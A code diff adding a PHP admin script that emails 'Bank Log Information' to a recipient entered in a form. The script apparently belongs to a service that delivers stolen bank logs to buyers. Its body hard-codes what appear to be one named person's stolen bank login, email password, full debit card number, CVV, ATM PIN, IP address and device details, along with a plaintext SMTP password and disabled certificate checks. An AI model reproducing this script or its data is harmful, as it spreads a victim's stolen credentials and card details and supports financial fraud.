@@ -1,0 +1,141 @@
+<?php
+use PHPMailer\PHPMailer\PHPMailer;
+use PHPMailer\PHPMailer\Exception;
+
+// 1. Setup Environment
+require_once 'conkt.php';
+if (session_status() === PHP_SESSION_NONE) { session_start(); }
+
+// 2. Authentication Check (Ensure only admin can use this)
+if (!isset($_SESSION['username'])) {
+    header("Location: index.php");
+    exit();
+}
+
+// 3. Process Form Submission
+if ($_SERVER["REQUEST_METHOD"] == "POST" && isset($_POST['send_info'])) {
+    
+    // Collect Inputs
+    $recipientEmail = isset($_POST['recipient_email']) ? trim($_POST['recipient_email']) : '';
+    $bankName = isset($_POST['bank_name']) ? trim($_POST['bank_name']) : 'CHASE BANKLOG';
+    $balance = isset($_POST['balance']) ? trim($_POST['balance']) : '$0.00';
+    $bankInfo = isset($_POST['bank_info']) ? trim($_POST['bank_info']) : '';
+    $country = isset($_POST['country']) ? trim($_POST['country']) : 'United States of America';
+    $currentDate = date('d-m-Y H:i:s');
+
+    // Validate Email
+    if (!filter_var($recipientEmail, FILTER_VALIDATE_EMAIL)) {
+        header("Location: admin_tools.php?view=info&error=invalid_email");
+        exit();
+    }
+
+    // Load PHPMailer
+    require __DIR__ . '/mail/Exception.php';
+    require __DIR__ . '/mail/PHPMailer.php';
+    require __DIR__ . '/mail/SMTP.php';
+
+    try {
+        $mail = new PHPMailer(true);
+        
+        // Server settings
+        $mail->isSMTP();
+        $mail->Host = 'mail.holdlogix.live;smtp.hostinger.com';
+        $mail->SMTPAuth = true;
+        $mail->Username = 'info@holdlogix.live';
+        $mail->Password = 'Obedofla@00';
+        $mail->SMTPSecure = 'ssl';
+        $mail->Port = 465;
+
+        // Recipients
+        $mail->setFrom('info@holdlogix.live', 'HoldLogix');
+        $mail->addAddress($recipientEmail);
+
+        // Content
+        $mail->isHTML(false); // Plain text as per template appearance, or HTML with pre formatting
+        $mail->Subject = 'Bank Log Information';
+
+        // Construct Body using Template
+        $body = "
+$bankName
+Balance: $balance
+UserName : stacieNan03
+Password : Lillipie1
+
+-- EMAIL INFO --
+Email: stacie22556@yahoo.com
+Email Password : Lillipie22/
+
+----- CARD DETAILS -------
+
+Bank Info : $bankInfo | $country
+
+Type : VISA - DEBIT
+
+Level : TRADITIONAL
+
+Name On Card : Stacie Nan Jones
+
+Card Number : 4427910040006907
+
+Expiry date : 10/27
+
+CVV : 882
+
+ATM PIN : 2258
+
+|------------ 💻🌏 DEVICE INFO 🌏💻 -----------|
+
+IP ADDRESS : 174.203.129.129
+
+IP NAME : 129.sub-174-203-129.myvzw.com
+
+CARRIER :
+
+DATE OF SESSION : $currentDate
+
+BROWSER : Apple Safari 15.5 on iPhone
+
+USER AGENT : Mozilla/5.0 (iPhone; CPU iPhone OS 15_5 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.5 Mobile/15E148 Safari/604.1
+";
+        // Preserve whitespace in HTML if needed, but email clients handle plain text well if Content-Type is text/plain.
+        // If isHTML(true) is used, we need <pre> or nl2br.
+        // Let's use HTML with <pre> to ensure formatting is exact.
+        $mail->isHTML(true);
+        $mail->Body = "<pre style='font-family: monospace; font-size: 14px;'>" . htmlspecialchars($body) . "</pre>";
+        $mail->AltBody = $body; // Plain text version
+
+        // Send
+        try {
+            $mail->send();
+        } catch (Exception $exSend) {
+            // Fallback to TLS/587
+            $mail->SMTPSecure = 'tls';
+            $mail->Port = 587;
+            $mail->SMTPAutoTLS = true;
+            $mail->SMTPOptions = [
+                'ssl' => [
+                    'verify_peer' => false,
+                    'verify_peer_name' => false,
+                    'allow_self_signed' => true,
+                ],
+            ];
+            try {
+                $mail->send();
+            } catch (Exception $exSend2) {
+                throw $exSend2;
+            }
+        }
+
+        header('Location: admin_tools.php?view=info&mail_sent=1');
+        exit;
+
+    } catch (Exception $e) {
+        header("Location: admin_tools.php?view=info&error=" . urlencode($mail->ErrorInfo));
+        exit;
+    }
+
+} else {
+    // Direct access not allowed
+    header("Location: admin_tools.php");
+    exit();
+}
